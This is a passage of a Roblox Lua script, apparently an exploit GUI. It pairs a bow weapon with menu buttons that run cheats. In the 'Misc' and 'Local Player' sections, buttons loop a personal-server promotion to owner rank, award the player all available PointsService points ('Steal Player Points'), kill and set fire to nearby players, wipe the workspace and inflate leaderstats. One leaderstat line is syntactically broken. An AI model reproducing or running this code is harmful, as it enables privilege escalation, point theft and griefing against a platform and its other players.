		Arr.CFrame = Face
		local Go = 2.8+(power/30)
		local Dist = 200+(power*2.8)
		local Drop = 0.55/(Go*1.25)
		local lastP = Start
		local didhit = false
		local omg = 0
		local hit2, pos2 = RayC(torso.CFrame * CN(0, 0, -0.4).p, torso.CFrame * CN(0, 0, -2).p, 2.5, char)
		local hu2 = nil
		if hit2 then
			local hh = getHumanoid(hit2.Parent)
			if hh then
				hit2 = nil
			end
		end
		for i = Go, Dist, Go do
			Drop = Drop + 1/(Go*3.5)
			omg = omg + Drop
			local dropping = CA(MR(-Drop), 0, 0)
			if omg > 130 then
				dropping = CN()
			end
			Face = Face * dropping * CN(0, 0, -Go)
			Arr.CFrame = Face * CA(MR(-180), 0, 0)
			local hit, p = RayC(lastP, Face.p, Go+0.5, char)
			local eff = Part(Mo, true, false, 0, 0, "Really black", 0.2, 1, 0.2)
			local magn = (lastP - Face.p).magnitude
			local cf = CN(lastP, Face.p) * CA(MR(-90), 0, 0)
			if hit then
				magn = (lastP - p).magnitude
				cf = CN(lastP, p) * CA(MR(-90), 0, 0)
			end
			local mes2 = Instance.new("SpecialMesh",eff)
			mes2.Scale = Vector3.new(0.6, magn, 0.6)
			eff.CFrame = cf * CN(0, magn/2, 0)
			Notime(function()
				for i = 0, 1, 0.12 do
					wait()
					eff.Transparency = i
					eff.Reflectance = 0.15*i
					mes2.Scale = Vector3.new(0.6-0.6*i, magn, 0.6-0.6*i)
				end
				eff:remove()
			end)
			local realhit = hit
			if hit2 then realhit = hit2 p = pos2 end
			if hit or hit2 then
				local h = getHumanoid(realhit.Parent)
				local sound = Sounds.Stick
				if h and hit.Parent.className ~= "Hat" then
					local d = MRA(12+DMG+(power/8), 20+DMG+(power/5.5))
					hit:remove()
					if hit.Name == "Head" then
						d = math.floor(d*1.4)
						hit:remove()
					end
					Dmg(h, d, p)
					sound = Sounds.Hit
				elseif h == nil and realhit.Parent.className ~= "Hat" then
					if realhit.Anchored == false then
						Notime(function()
							wait(0.08)
							local mas = realhit:GetMass()/5+2
							local vel = (16+(power/3))/mas
							if vel < 0 then vel = 0 end
							realhit.Velocity = (CN(lastP, p).lookVector) * vel
						end)
					end
				end
				local a = -1.2
				if realhit.Anchored then
					Arr.CFrame = CN(p, lastP) * CN(0, 0, a)
					if realhit == hit2 then
						Arr.CFrame = CN(Start, pos2) * CN(0, 0, -1.9)
					end
				else
					a = (power-200)/110
					local w8 = 13
					if realhit.Parent.className == "Hat" then
						a = ((power/2)-170)/110
						w8 = 5
					end
					Arr.Anchored = false
					local w = Weld(realhit, Arr, 0, 0, 0, 0, 0, 0)
					w.C1 = ((CN(p, lastP) * CN(0, 0, a)):toObjectSpace(realhit.CFrame))
					if realhit == hit2 then
						w.C1 = ((CN(Start, pos2) * CN(0, 0, -1.9)):toObjectSpace(realhit.CFrame))
					end
					Notime(function()
						if power < 50 then
							wait(w8+power/7.5)
							local caa = Arr.CFrame
							w:remove()
							Arr.Size = Vector3.new(0.3, 0.3, 4)
							Arr.CFrame = caa
							Arr.CanCollide = true
						end
					end)
				end
				didhit = true
				Notime(
					function()
						wait(26)
						for i = 0, 1, 0.02 do
							Arr.Transparency = i
							wait()
						end
						Arr:remove()
					end
				)
				Play(sound)
				local Surface = DetectSurface(p, realhit)
				AddDetail(Surface, p, h ~= nil and hit.Parent.className ~= "Hat", realhit, h)
				wait(0.05)
				break
			end
			lastP = Face.p
			wait()
		end
		if didhit == false then
			for i = 0, 1, 0.2 do
				Arr.Transparency = i
				wait()
			end
			Arr:remove()
		end
	end
	function Shoot(mouse)
		Shooting = true
		RAW.Part1 = Rarm
		Atch(FTorso)
		FTorso.Transparency = 0
		torso.Transparency = 1
		local shoot = false
		Spec.BorderColor3 = C3()
		local amg, omg = false, false
		Notime(function()
			repeat
				wait()
			until Selected == false or omg
			if omg == false then
				omg = true
				Shooting = false
				Reloading = false
				Hurt = false
				Slashing = false
				Normal()
				EE()
				return
			end
		end)
		Notime(function()
			mouse.Button1Up:wait()
			shoot = true
		end)
		for i = 0.16, 1, 0.16 do
			FWeld.C0 = CA(0, MR(-80*i), 0)
			LAW.C0 = CA(MR(85*i), 0, MR(-30-25*i)) * CN(0.3*i, 0.4*i, -0.1*i)
			RAW.C0 = CA(MR(85*i), 0, MR(-70*i)) * CN(0.65*i, -1.2*i, 0)
			HW.C0 = CA(MR(180), 0, MR(150+60*i))
			AW.C0 = CA(MR(85*i), 0, 0) * CN(0, 0, 2.1*i)
			wait()
		end
		for i = 0.33, 1, 0.33 do
			FWeld.C0 = CA(0, MR(-80-10*i), 0)
			LAW.C0 = CA(MR(85+5*i), 0, MR(-55-5*i)) * CN(0.3, 0.4, -0.1)
			RAW.C0 = CA(MR(85+5*i), 0, MR(-70-5*i)) * CN(0.65+0.05*i, -1.2-0.1*i, 0)
			HW.C0 = CA(MR(180), 0, MR(210+5*i))
			AW.C0 = CA(MR(85+5*i), MR(-15*i), 0) * CN(0, 0, 2.1+0.1*i)
			wait()
		end
		LAW.C0 = CA(MR(90), 0, MR(-60)) * CN(0.3, 0.4, -0.1)
		HW.C0 = CA(MR(180), 0, MR(215))
		FWeld.C0 = CA(0, MR(-90), 0)
		for i = 0.25, 1, 0.25 do
			RAW.C0 = CA(MR(90), 0, MR(-75)) * CN(0.7, -1.3+1.2*i, 0)
			SUW.C0 = CN(0, 0.15, 0) * CA(MR(-26*i), 0, 0)
			SUW.C1 = CN(0, -0.22*i, 0) * ORSU
			SUM.Scale = Vector3.new(0.4, 2.4+0.3*i, 0.4)
			SDW.C0 = CN(0, -0.15, 0) * CA(MR(26*i), 0, 0)
			SDM.Scale = Vector3.new(0.4, 2.4+0.3*i, 0.4)
			SDW.C1 = CN(0, 0.25*i, 0) * ORSD
			wait()
		end
		for i = 0.33, 1, 0.33 do
			RAW.C0 = CA(MR(90), 0, MR(-75)) * CN(0.7, -0.1+0.1*i, 0)
			SUW.C0 = CN(0, 0.15, 0) * CA(MR(-26-4*i), 0, 0)
			SUW.C1 = CN(0, -0.22-0.03*i, 0) * ORSU
			SUM.Scale = Vector3.new(0.4, 2.7+0.1*i, 0.4)
			SDW.C0 = CN(0, -0.15, 0) * CA(MR(26+4*i), 0, 0)
			SDM.Scale = Vector3.new(0.4, 2.7+0.1*i, 0.4)
			SDW.C1 = CN(0, 0.22+0.04*i, 0) * ORSD
			wait()
		end
		RAW.C0 = CA(MR(90), 0, MR(-75)) * CN(0.7, 0, 0)
		local powe = 10
		Main.Visible = true
		Bar.Size = UD(powe/MaximumPower, 0, 1, 0)
		Notime(function()
			repeat wait() until powe >= MaximumPower or shoot
			wait(6)
			if shoot == false then
				shoot = true
			end
		end)
		repeat
			wait()
			powe = powe + 4.8
			if powe > MaximumPower then powe = MaximumPower end
			Bar.Size = UD(powe/MaximumPower, 0, 1, 0)
			local sped = 16-((powe/MaximumPower)*9) if Selected == false then sped = 16 end
			Hum.WalkSpeed = sped
		until shoot
		Main.Visible = false
		Notime(function()
			for i = 0.5, 1, 0.5 do
				SUW.C0 = CN(0, 0.15, 0) * CA(MR(-30+30*i), 0, 0)
				SUW.C1 = CN(0, -0.25+0.25*i, 0) * ORSU
				SUM.Scale = Vector3.new(0.4, 2.8-0.4*i, 0.4)
				SDW.C0 = CN(0, -0.15, 0) * CA(MR(30-30*i), 0, 0)
				SDM.Scale = Vector3.new(0.4, 2.8-0.4*i, 0.4)
				SDW.C1 = CN(0, 0.25-0.25*i, 0) * ORSD
				wait()
			end
		end)
		local pos = mouse.Hit.p
		ArrowOn = false
		Arrow.Transparency = 1
		Notime(function()
			Play(Sounds.Shoot)
			ShootArrow(pos, powe, mouse.Target)
		end)
		for i = 0.2, 1, 0.2 do
			FWeld.C0 = CA(0, MR(-90+25*i), 0)
			LAW.C0 = CA(MR(90+25*i), 0, MR(-60-15*i)) * CN(0.3-0.3*i, 0.4-0.4*i, -0.1+0.1*i)
			RAW.C0 = CA(MR(90+60*i), 0, MR(-75+55*i)) * CN(0.7-0.5*i, -0.1*i, 0)
			HW.C0 = CA(MR(180), 0, MR(215-65*i))
			wait()
		end
		Hum.WalkSpeed = 16
		for i = 0.25, 1, 0.25 do
			FWeld.C0 = CA(0, MR(-65+5*i), 0)
			LAW.C0 = CA(MR(115+5*i), 0, MR(-75-5*i))
			RAW.C0 = CA(MR(150+10*i), 0, MR(-20+5*i)) * CN(0.2-0.1*i, -0.1-0.05*i, 0)
			HW.C0 = CA(MR(180), 0, MR(150))
			wait()
		end
		for i = 0.14, 1, 0.14 do
			FWeld.C0 = CA(0, MR(-60+55*i), 0)
			LAW.C0 = CA(MR(120-110*i), 0, MR(-80+45*i))
			RAW.C0 = CA(MR(160-150*i), 0, MR(-15+10*i)) * CN(0.1-0.1*i, -0.15+0.15*i, 0)
			wait()
		end
		for i = 0.33, 1, 0.33 do
			FWeld.C0 = CA(0, MR(-5+5*i), 0)
			LAW.C0 = CA(MR(10-10*i), 0, MR(-35+5*i))
			RAW.C0 = CA(MR(10-10*i), 0, MR(-5+5*i))
			wait()
		end
		AW.C0 = CN()
		FWeld.C0 = CN()
		LAW.C0 = CA(0, 0, MR(-30))
		HW.C0 = CA(MR(180), 0, MR(150))
		FTorso.Transparency = 1
		torso.Transparency = 0
		Atch(torso)
		Shooting = false
		RAW.Part1 = nil
		RAW.C0 = CN()
		Spec.BorderColor3 = C3()
		omg = true
	end
	function SpecialAtk(mouse)
		if Special < 50 then return end
		Shooting = true
		Spec.BorderColor3 = C3(0, 1, 0)
		RAW.Part1 = Rarm
		Atch(FTorso)
		FTorso.Transparency = 0
		torso.Transparency = 1
		local amg, omg = false, false
		Notime(function()
			repeat
				wait()
			until Selected == false or omg
			if omg == false then
				omg = true
				Shooting = false
				Reloading = false
				Hurt = false
				Slashing = false
				Normal()
				EE()
				return
			end
		end)
		local shoot = false
		Notime(function()
			mouse.Button1Up:wait()
			shoot = true
		end)
		for i = 0.2, 1, 0.2 do
			FWeld.C0 = CA(0, MR(-80*i), 0)
			LAW.C0 = CA(MR(85*i), 0, MR(-30-25*i)) * CN(0.3*i, 0.4*i, -0.1*i)
			RAW.C0 = CA(MR(85*i), 0, MR(-70*i)) * CN(0.65*i, -1.2*i, 0)
			HW.C0 = CA(MR(180), 0, MR(150+60*i))
			AW.C0 = CA(MR(85*i), 0, 0) * CN(0, 0, 2.1*i)
			wait()
		end
		for i = 0.5, 1, 0.5 do
			FWeld.C0 = CA(0, MR(-80-10*i), 0)
			LAW.C0 = CA(MR(85+5*i), 0, MR(-55-5*i)) * CN(0.3, 0.4, -0.1)
			RAW.C0 = CA(MR(85+5*i), 0, MR(-70-5*i)) * CN(0.65+0.05*i, -1.2-0.1*i, 0)
			HW.C0 = CA(MR(180), 0, MR(210+5*i))
			AW.C0 = CA(MR(85+5*i), MR(-15*i), 0) * CN(0, 0, 2.1+0.1*i)
			wait()
		end
		LAW.C0 = CA(MR(90), 0, MR(-60)) * CN(0.3, 0.4, 0)
		HW.C0 = CA(MR(180), 0, MR(215))
		FWeld.C0 = CA(0, MR(-90), 0)
		AW.C0 = CA(MR(90), MR(-15), 0) * CN(0, 0, 2.2)
		for i = 0.33, 1, 0.33 do
			RAW.C0 = CA(MR(90), 0, MR(-75)) * CN(0.7, -1.3+1.2*i, 0)
			SUW.C0 = CN(0, 0.15, 0) * CA(MR(-26*i), 0, 0)
			SUW.C1 = CN(0, -0.22*i, 0) * ORSU
			SUM.Scale = Vector3.new(0.4, 2.4+0.3*i, 0.4)
			SDW.C0 = CN(0, -0.15, 0) * CA(MR(26*i), 0, 0)
			SDM.Scale = Vector3.new(0.4, 2.4+0.3*i, 0.4)
			SDW.C1 = CN(0, 0.25*i, 0) * ORSD
			wait()
		end
		for i = 0.5, 1, 0.5 do
			RAW.C0 = CA(MR(90), 0, MR(-75)) * CN(0.7, -0.1+0.1*i, 0)
			SUW.C0 = CN(0, 0.15, 0) * CA(MR(-26-4*i), 0, 0)
			SUW.C1 = CN(0, -0.22-0.03*i, 0) * ORSU
			SUM.Scale = Vector3.new(0.4, 2.7+0.1*i, 0.4)
			SDW.C0 = CN(0, -0.15, 0) * CA(MR(26+4*i), 0, 0)
			SDM.Scale = Vector3.new(0.4, 2.7+0.1*i, 0.4)
			SDW.C1 = CN(0, 0.22+0.04*i, 0) * ORSD
			wait()
		end
		RAW.C0 = CA(MR(90), 0, MR(-75)) * CN(0.7, 0, 0)
		local powe = 0
		Main.Visible = true
		Bar.Size = UD(powe/MaximumPower, 0, 1, 0)
		Notime(function()
			repeat wait() until powe >= MaximumPower or shoot
			if shoot == false then
				shoot = true
			end
		end)
		repeat
			wait()
			powe = powe + 5
			if powe > MaximumPower then powe = MaximumPower end
			Bar.Size = UD(powe/MaximumPower, 0, 1, 0)
			local sped = 16-((powe/MaximumPower)*9) if Selected == false then sped = 16 end
			Hum.WalkSpeed = sped
		until shoot
		Special = Special - 50
		Main.Visible = false
		local pos = mouse.Hit.p
		Notime(function()
			Play(Sounds.Shoot)
			ShootArrow(pos, powe/1.2, mouse.Target)
		end)
		SUW.C0 = CN(0, 0.15, 0) * CA(0, 0, 0)
		SUW.C1 = CN(0, 0, 0) * ORSU
		SUM.Scale = Vector3.new(0.4, 2.4, 0.4)
		SDW.C0 = CN(0, -0.15, 0) * CA(0, 0, 0)
		SDM.Scale = Vector3.new(0.4, 2.4, 0.4)
		SDW.C1 = CN(0, 0, 0) * ORSD
		for i = 0.33, 1, 0.33 do
			RAW.C0 = CA(MR(90), 0, MR(-75)) * CN(0.7, -1.3*i, 0)
			wait()
		end
		for i = 0.33, 1, 0.33 do
			RAW.C0 = CA(MR(90), 0, MR(-75)) * CN(0.7, -1.3+1.2*i, 0)
			SUW.C0 = CN(0, 0.15, 0) * CA(MR(-26*i), 0, 0)
			SUW.C1 = CN(0, -0.22*i, 0) * ORSU
			SUM.Scale = Vector3.new(0.4, 2.4+0.3*i, 0.4)
			SDW.C0 = CN(0, -0.15, 0) * CA(MR(26*i), 0, 0)
			SDM.Scale = Vector3.new(0.4, 2.4+0.3*i, 0.4)
			SDW.C1 = CN(0, 0.25*i, 0) * ORSD
			wait()
		end
		for i = 0.5, 1, 0.5 do
			RAW.C0 = CA(MR(90), 0, MR(-75)) * CN(0.7, -0.1+0.1*i, 0)
			SUW.C0 = CN(0, 0.15, 0) * CA(MR(-26-4*i), 0, 0)
			SUW.C1 = CN(0, -0.22-0.03*i, 0) * ORSU
			SUM.Scale = Vector3.new(0.4, 2.7+0.1*i, 0.4)
			SDW.C0 = CN(0, -0.15, 0) * CA(MR(26+4*i), 0, 0)
			SDM.Scale = Vector3.new(0.4, 2.7+0.1*i, 0.4)
			SDW.C1 = CN(0, 0.22+0.04*i, 0) * ORSD
			wait()
		end
		Notime(function()
			Arrow.Transparency = 1
			ArrowOn = false
			Play(Sounds.Shoot)
			ShootArrow(pos, powe/1.2, mouse.Target)
		end)
		Notime(function()
			for i = 0.5, 1, 0.5 do
				SUW.C0 = CN(0, 0.15, 0) * CA(MR(-30+30*i), 0, 0)
				SUW.C1 = CN(0, -0.25+0.25*i, 0) * ORSU
				SUM.Scale = Vector3.new(0.4, 2.9-0.5*i, 0.4)
				SDW.C0 = CN(0, -0.15, 0) * CA(MR(30-30*i), 0, 0)
				SDM.Scale = Vector3.new(0.4, 2.9-0.5*i, 0.4)
				SDW.C1 = CN(0, 0.25-0.25*i, 0) * ORSD
				wait()
			end
		end)
		for i = 0.25, 1, 0.25 do
			FWeld.C0 = CA(0, MR(-90+25*i), 0)
			LAW.C0 = CA(MR(90+25*i), 0, MR(-60-15*i)) * CN(0.3-0.3*i, 0.4-0.4*i, -0.1+0.1*i)
			RAW.C0 = CA(MR(90+60*i), 0, MR(-75+55*i)) * CN(0.7-0.5*i, -0.1*i, 0)
			HW.C0 = CA(MR(180), 0, MR(215-65*i))
			wait()
		end
		Hum.WalkSpeed = 16
		for i = 0.33, 1, 0.33 do
			FWeld.C0 = CA(0, MR(-65+5*i), 0)
			LAW.C0 = CA(MR(115+5*i), 0, MR(-75-5*i))
			RAW.C0 = CA(MR(150+10*i), 0, MR(-20+5*i)) * CN(0.2-0.1*i, -0.1-0.05*i, 0)
			HW.C0 = CA(MR(180), 0, MR(150))
			wait()
		end
		for i = 0.16, 1, 0.16 do
			FWeld.C0 = CA(0, MR(-60+55*i), 0)
			LAW.C0 = CA(MR(120-110*i), 0, MR(-80+45*i))
			RAW.C0 = CA(MR(160-150*i), 0, MR(-15+10*i)) * CN(0.1-0.1*i, -0.15+0.15*i, 0)
			wait()
		end
		for i = 0.5, 1, 0.5 do
			FWeld.C0 = CA(0, MR(-5+5*i), 0)
			LAW.C0 = CA(MR(10-10*i), 0, MR(-35+5*i))
			RAW.C0 = CA(MR(10-10*i), 0, MR(-5+5*i))
			wait()
		end
		Spec.BorderColor3 = C3()
		AW.C0 = CN()
		FWeld.C0 = CN()
		LAW.C0 = CA(0, 0, MR(-30))
		HW.C0 = CA(MR(180), 0, MR(150))
		FTorso.Transparency = 1
		torso.Transparency = 0
		Atch(torso)
		Shooting = false
		RAW.Part1 = nil
		RAW.C0 = CN()
		omg = false
	end
	function Sel(mouse)
		mouse.Icon = Icon
		SelectAnim()
		Selected = true
		mouse.KeyDown:connect(function(key)
			key = key:lower()
			if Reloading == false and Slashing == false and Shooting == false then
				if key == "f" then
					Reload()
				end
			end
			if Shooting == false then
				if key == "e" then
					Keys.e = true
					local k
					Spec.BorderColor3 = C3(1, 1, 0.4)
					repeat
						wait()
						k = mouse.KeyUp:wait()
					until k == "e"
					Keys.e = false
					if Shooting == false then
						Spec.BorderColor3 = C3()
					end
				end
			end
		end)
		mouse.Button1Down:connect(function()
			if Reloading == false and Slashing == false and Shooting == false then
				if ArrowOn == false then
					local yesh = true
					Notime(function()
						mouse.Button1Up:wait()
						yesh = false
					end)
					local ah = Keys.e
					Reload()
					if yesh then
						local mm = Special >= 50
						if ah and mm or Keys.e and mm then
							SpecialAtk(mouse)
						else
							Shoot(mouse)
						end
					end
				else
					local mm = Special >= 50
					if Keys.e and mm then
						SpecialAtk(mouse)
					else
						Shoot(mouse)
					end
				end
			end
		end)
	end
	function Desel(mouse)
		Selected = false
		Main.Visible = false
		Hum.WalkSpeed = 16
		DeselectAnim()
	end
	bin.Deselected:connect(Desel)
	bin.Selected:connect(Sel)
	while Mo.Parent == char do
		wait()
		Special = Special + 0.07
		if Special > MaxSpecial then Special = MaxSpecial end 
		SpecialBar.Size = UDim2.new(Special/MaxSpecial, 0, 1, 0)
	end	
end)
local title = Instance.new("TextLabel")
title.Parent = gt
title.BackgroundColor3 = blak
title.BorderColor3 = rede
title.BorderSizePixel = 3
title.Name = "Title"
title.Size = UDim2.new(1,0,0,30)
title.ZIndex = 2
title.Font = "SourceSansBold"
title.FontSize = "Size14"
title.Text = "Gear/Tools"
title.TextColor3 = whit
local title = Instance.new("TextLabel")
title.Parent = ws
title.BackgroundColor3 = blak
title.BorderColor3 = rede
title.BorderSizePixel = 3
title.Name = "Title"
title.Size = UDim2.new(1,0,0,30)
title.ZIndex = 2
title.Font = "SourceSansBold"
title.FontSize = "Size14"
title.Text = "Weapon Scripts"
title.TextColor3 = whit
-- Page 2 End --




-- Misc --
local button = Instance.new("TextButton")
button.Parent = misc
button.BackgroundColor3 = blak
button.BorderColor3 = rede
button.BorderSizePixel = 3
button.Name = "Become Owner in Personal Server"
button.Position = UDim2.new(0,0,0,33)
button.Size = UDim2.new(0.5,0,0,30)
button.ZIndex = 2
button.Font = tef
button.FontSize = "Size14"
button.Text = "Become Owner [PS]"
button.TextColor3 = whit
button.TextWrapped = true
button.MouseButton1Down:connect(function()
	while game.Players.LocalPlayer.PersonalServerRank<255 do
		game:GetService("PersonalServerService"):Promote(game.Players.LocalPlayer)
	end
end)
--
local button = Instance.new("TextButton")
button.Parent = misc
button.BackgroundColor3 = blak
button.BorderColor3 = rede
button.BorderSizePixel = 3
button.Name = "Disco Fog"
button.Position = UDim2.new(0.5,3,0,33)
button.Size = UDim2.new(0.5,-3,0,30)
button.ZIndex = 2
button.Font = tef
button.FontSize = "Size14"
button.Text = "Disco Fog"
button.TextColor3 = whit
button.TextWrapped = true
button.MouseButton1Down:connect(function()
	basics = {Color3.new(255/255,0/255,0/255),Color3.new(255/255,85/255,0/255),Color3.new(218/255,218/255,0/255),Color3.new(0/255,190/255,0/255),Color3.new(0/255,85/255,255/255),Color3.new(0/255,0/255,127/255),Color3.new(170/255,0/255,255/255),Color3.new(0/255,204/255,204/255),Color3.new(255/255,85/255,127/255),Color3.new(0/255,0/255,0/255),Color3.new(255/255,255/255,255/255)}
	game.Lighting.FogStart = 25
	game.Lighting.FogEnd = 300
	while true do
		wait(0.5)
		game.Lighting.FogColor = basics[math.random(1,#basics)]
	end
end)
--
local button = Instance.new("TextButton")
button.Parent = misc
button.BackgroundColor3 = blak
button.BorderColor3 = rede
button.BorderSizePixel = 3
button.Name = "Fencing Restore"
button.Position = UDim2.new(0,0,0,66)
button.Size = UDim2.new(0.5,0,0,30)
button.ZIndex = 2
button.Font = tef
button.FontSize = "Size14"
button.Text = "Fencing Restore"
button.TextColor3 = whit
button.TextWrapped = true
button.MouseButton1Down:connect(function()
	--Fencing Restore script made by Yelock--
	--Now restoring fencing Please wait ----------
	--Censore
	--mediafire
	--hitler
	--megaupload
	--globe of geeks
	--lego
	--cheez
	--chicken
	--requires c>2
	function X(ws)
		for _, v in pairs(ws:GetChildren()) do
			v.Archivable = true
			if v.Name ~= "UClear" and v.Name ~= "Terrain" and game.Players:GetPlayerFromCharacter(v)==nil and v~=game.Workspace.CurrentCamera then
				if v:IsA("Script") or v:IsA("LocalScript") then
					v.Disabled = true
					v:remove()
				else
					v:remove()
				end
			end
			if game.Workspace:findFirstChild("Base") ~= nil then
			else
				local Base=Instance.new("Part",game.Workspace) 
				Base.Name="Base" 
				Base.Size=Vector3.new(1000,1,1000) 
				Base.BrickColor=BrickColor.new("Earth green") 
				Base.Anchored=true 
				Base.Locked=true 
				Base.TopSurface="Universal" 
				Base.CFrame=CFrame.new(Vector3.new(0,0,0)) 
				local Spawn=Instance.new("SpawnLocation",game.Workspace)
				Spawn.Name="lol"
				Spawn.Size=Vector3.new(6,1,6)
				Spawn.Transparency=1
				Spawn.CanCollide=false
				Spawn.Anchored=true
				Spawn.Locked=true
				Spawn.CFrame=CFrame.new(Vector3.new(0,1,0))
			end
		end
	end
	X(game.Workspace)
	X(game.Teams)
	X(game.StarterGui)
	wait()
	game.Workspace:InsertContent("rbxassetid://118791953")
	wait()
	game.workspace.Base:Destroy()
	wait()
	game.workspace.lol:Destroy()
	wait()
	game.Lighting.Ambient = Color3.new(255,255,255)
	game.Lighting.TimeOfDay = 12
	game.Lighting.Brightness = 0.5
	game.Lighting.FogEnd = 100000
	game.Lighting.GlobalShadows = false
	game.Lighting.Sky:Destroy()
	game.Lighting.FogEnd = 100000
	game.Lighting.Brightness = 1
	game.Workspace.Terrain:clear()
end)
--
local button = Instance.new("TextButton")
button.Parent = misc
button.BackgroundColor3 = blak
button.BorderColor3 = rede
button.BorderSizePixel = 3
button.Name = "Leaderstat Add"
button.Position = UDim2.new(0.5,3,0,66)
button.Size = UDim2.new(0.5,-3,0,30)
button.ZIndex = 2
button.Font = tef
button.FontSize = "Size14"
button.Text = "Leaderstat Add"
button.TextColor3 = whit
button.TextWrapped = true
button.MouseButton1Down:connect(function()
	while true do
		wait(.1)
		game.Players.LocalPlayer.leaderstats:FindFirstChild(frame.Settings.Page2["Leaderstat Name"].TextBox.Text).Value = game.Players.LocalPlayer.leaderstats:FindFirstChild(frame.Settings.Page2["Leaderstat Name"].TextBox.Text)+game.Players.LocalPlayer.leaderstats:FindFirstChild(frame.Settings.Page2["Leaderstat Amount"].TextBox.Text)	
	end
end)
--
local button = Instance.new("TextButton")
button.Parent = misc
button.BackgroundColor3 = blak
button.BorderColor3 = rede
button.BorderSizePixel = 3
button.Name = "Leaderstat Change"
button.Position = UDim2.new(0,0,0,99)
button.Size = UDim2.new(0.5,0,0,30)
button.ZIndex = 2
button.Font = tef
button.FontSize = "Size14"
button.Text = "Leaderstat Change"
button.TextColor3 = whit
button.TextWrapped = true
button.MouseButton1Down:connect(function()
	game.Players.LocalPlayer.leaderstats:FindFirstChild(frame.Settings.Page2["Leaderstat Name"].TextBox.Text)game.Players.LocalPlayer.leaderstats:FindFirstChild(frame.Settings.Page2["Leaderstat Amount"].TextBox.Text)	

end)
--
local button = Instance.new("TextButton")
button.Parent = misc
button.BackgroundColor3 = blak
button.BorderColor3 = rede
button.BorderSizePixel = 3
button.Name = "Play Music"
button.Position = UDim2.new(0.5,3,0,99)
button.Size = UDim2.new(0.5,-3,0,30)
button.ZIndex = 2
button.Font = tef
button.FontSize = "Size14"
button.Text = "Play Music"
button.TextColor3 = whit
button.TextWrapped = true
button.MouseButton1Down:connect(function()
	for i,v in pairs(game.Workspace:GetChildren()) do
		if v.className == "Sound" then
			v:Stop()
			v:Remove()	
		end	
	end
	s = Instance.new("Sound",Workspace)
	s.SoundId = "rbxassetid://"..frame.Settings.Page1["Music ID"].TextBox.Text
	s.Volume = 1
	s.Looped = true
	s.Pitch = frame.Settings.Page1["Music Pitch"].TextBox.Text
	s:Play()
	wait(.1)
	s:Play()
end)
--
local button = Instance.new("TextButton")
button.Parent = misc
button.BackgroundColor3 = blak
button.BorderColor3 = rede
button.BorderSizePixel = 3
button.Name = "Restore Skybox"
button.Position = UDim2.new(0,0,0,132)
button.Size = UDim2.new(0.5,0,0,30)
button.ZIndex = 2
button.Font = tef
button.FontSize = "Size14"
button.Text = "Restore Skybox"
button.TextColor3 = whit
button.TextWrapped = true
button.MouseButton1Down:connect(function()
	for i,v in pairs(game.Lighting:GetChildren()) do
		v:Remove()
	end
end)
--
local button = Instance.new("TextButton")
button.Parent = misc
button.BackgroundColor3 = blak
button.BorderColor3 = rede
button.BorderSizePixel = 3
button.Name = "Steal Player Points"
button.Position = UDim2.new(0.5,3,0,132)
button.Size = UDim2.new(0.5,-3,0,30)
button.ZIndex = 2
button.Font = tef
button.FontSize = "Size14"
button.Text = "Steal Player Points"
button.TextColor3 = whit
button.TextWrapped = true
button.MouseButton1Down:connect(function()
	local service = game:GetService("PointsService")
	service:AwardPoints(game.Players.LocalPlayer.userId, service:GetAwardablePoints())
end)
--
local button = Instance.new("TextButton")
button.Parent = misc
button.BackgroundColor3 = blak
button.BorderColor3 = rede
button.BorderSizePixel = 3
button.Name = "Empty"
button.Position = UDim2.new(0,0,0,165)
button.Size = UDim2.new(0.499,0,0,30)
button.ZIndex = 2
button.Font = tef
button.FontSize = "Size14"
button.Text = "Empty"
button.TextColor3 = whit
button.TextWrapped = true
button.MouseButton1Down:connect(function()

end)
--
local button = Instance.new("TextButton")
button.Parent = misc
button.BackgroundColor3 = blak
button.BorderColor3 = rede
button.BorderSizePixel = 3
button.Name = "Empty"
button.Position = UDim2.new(0.5,3,0,165)
button.Size = UDim2.new(0.5,-3,0,30)
button.ZIndex = 2
button.Font = tef
button.FontSize = "Size14"
button.Text = "Empty"
button.TextColor3 = whit
button.TextWrapped = true
button.MouseButton1Down:connect(function()

end)
--
local button = Instance.new("TextButton")
button.Parent = misc
button.BackgroundColor3 = blak
button.BorderColor3 = rede
button.BorderSizePixel = 3
button.Name = "Empty"
button.Position = UDim2.new(0,0,0,198)
button.Size = UDim2.new(0.499,0,0,30)
button.ZIndex = 3
button.Font = tef
button.FontSize = "Size14"
button.Text = "Empty"
button.TextColor3 = whit
button.TextWrapped = true
button.MouseButton1Down:connect(function()

end)
--
local button = Instance.new("TextButton")
button.Parent = misc
button.BackgroundColor3 = blak
button.BorderColor3 = rede
button.BorderSizePixel = 3
button.Name = "Empty"
button.Position = UDim2.new(0.5,3,0,198)
button.Size = UDim2.new(0.5,-3,0,30)
button.ZIndex = 2
button.Font = tef
button.FontSize = "Size14"
button.Text = "Empty"
button.TextColor3 = whit
button.TextWrapped = true
button.MouseButton1Down:connect(function()

end)

-- Local Player --
local button = Instance.new("TextButton")
button.Parent = localp
button.BackgroundColor3 = blak
button.BorderColor3 = rede
button.BorderSizePixel = 3
button.Name = "Anti-Robloxian"
button.Position = UDim2.new(0,0,0,33)
button.Size = UDim2.new(0.5,0,0,30)
button.ZIndex = 2
button.Font = tef
button.FontSize = "Size14"
button.Text = "Anti-Robloxian"
button.TextColor3 = whit
button.TextWrapped = true
button.MouseButton1Down:connect(function()
	local Player = game.Players.LocalPlayer
	while true do
		local dist = frame.Settings.Page2["Anti Robloxian Range"].TextBox.Text
		value = Instance.new("NumberValue", game.workspace)
		value.Value = dist
		local distance = 13
		if Player then
			c = game.Players:GetChildren()
			for i = 1, #c do
				if c[i].Name ~= Player.Name then
					if c[i]:DistanceFromCharacter(game.Workspace[Player.Name].Torso.Position) <= distance then
						c[i].Character:BreakJoints()
						c2 = c[i].Character:GetChildren()
						for i2 =1, #c2 do
							if c2[i2]:IsA("BasePart") then
								Instance.new("Fire", c2[i2])
							end end end end end end wait() end
end)
--
local button = Instance.new("TextButton")
button.Parent = localp
button.BackgroundColor3 = blak
button.BorderColor3 = rede
button.BorderSizePixel = 3
button.Name = "Billboard Gui"
button.Position = UDim2.new(0.5,3,0,33)
button.Size = UDim2.new(0.5,-3,0,30)
button.ZIndex = 2
button.Font = tef
button.FontSize = "Size14"
button.Text = "Billboard Gui"
button.TextColor3 = whit
button.TextWrapped = true
button.MouseButton1Down:connect(function()
	if game.Players.LocalPlayer.Character.Head:FindFirstChild("BillboardGui") then
		game.Players.LocalPlayer.Character.Head:FindFirstChild("BillboardGui"):Remove()	
	end
	plr = game.Players.LocalPlayer.Name
	y = Instance.new("BillboardGui")
	y.Size = UDim2.new(0,100,0,150)
